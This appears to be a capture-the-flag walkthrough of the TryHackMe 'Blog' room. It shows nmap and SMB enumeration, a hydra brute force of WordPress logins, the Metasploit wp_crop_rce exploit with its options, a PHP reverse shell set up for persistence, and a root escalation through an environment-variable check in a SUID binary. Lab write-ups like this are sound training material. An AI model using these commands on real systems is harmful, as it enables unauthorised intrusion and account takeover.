## **Description**

Hello hackers, I hope you are doing well. We are doing [Blog](https://tryhackme.com/room/blog) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.93.163                                                                                                                      [2/19]

There are 4 ports open on this ubuntu machine, port 22 running OpenSSH, 80 running Apache web server, and there is an SMB also running on the machine.

### SMB

Let's list the shares with the command `sudo smbclient -L {targetIP} -N`

```terminal
$ sudo smbclient -L 10.10.93.163 -N
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated

```

There is an interesting share called `BillySMB`, let's connect to with with the command `sudo smbclient //10.10.10.10/BillySMB -N`

```terminal
$ sudo smbclient //10.10.93.163/BillySMB -N                                                                                                            1 тип

```

We found tree file inside the share and downloaded them with `get {file_name}`.

All the files are rabbit holes and useless to us.

### Web

Let's add `blog.thm` to our /etc/hosts file and navigate to it.

![](1.png)

We found a wordpress blog that belongs to billy. After some enumeration, we find two users `bjoel` and `kwheel`. Let's brute force the login of these users.

```bash
hydra -l {username} -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"
```

![](2.png)

Got the password. Let's login.

![](3.png)

## **Foothold**

After successfully logging in, we can see at the bottom right of the dashboard the version of wordpress being used which is `5.0`. Let's check for available exploits in this version.

![](4.png)

There is a metasploit module that gives remote code execution via image upload.

Let's start metasploit, use `exploit/multi/http/wp_crop_rce` and set the required options as follows.

```
use exploit/multi/http/wp_crop_rce

set username {username}

set password {password}

set LHOST tun0

set RHOST blog.thm
```

Now enter `exploit` to run the module.

![](7.png)

Nice, we got a shell.

I uploaded a php reverse shell to wordpress root directory so that in case i lost the current session i don't have to run the exploit again.

![](5.png)

Next i setup a netcat listener and requested the file i uploaded.

![](6.png)


## **Privilege Escalation**

I uploaded a copy of linpeas to the target, run it and got the following.

![](8.png)

There is an unusual SUID binary that when we run it, it prints out `Not an Admin`

```terminal
$ /usr/sbin/checker
Not an Admin
```

Let's see what the binary does with `ltrace`.

```terminal
$ ltrace checker
getenv("admin")      = nil
puts("Not an Admin") = 13
Not an Admin 
```

The program gets checks the admin env variable, if it's null it prints the Not an Admin.

We can try setting the admin variable to anything

```terminal
www-data@blog:/tmp$ export admin=1
www-data@blog:/tmp$ checker
root@blog:/tmp# id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@blog:/tmp# 
```

Got root!
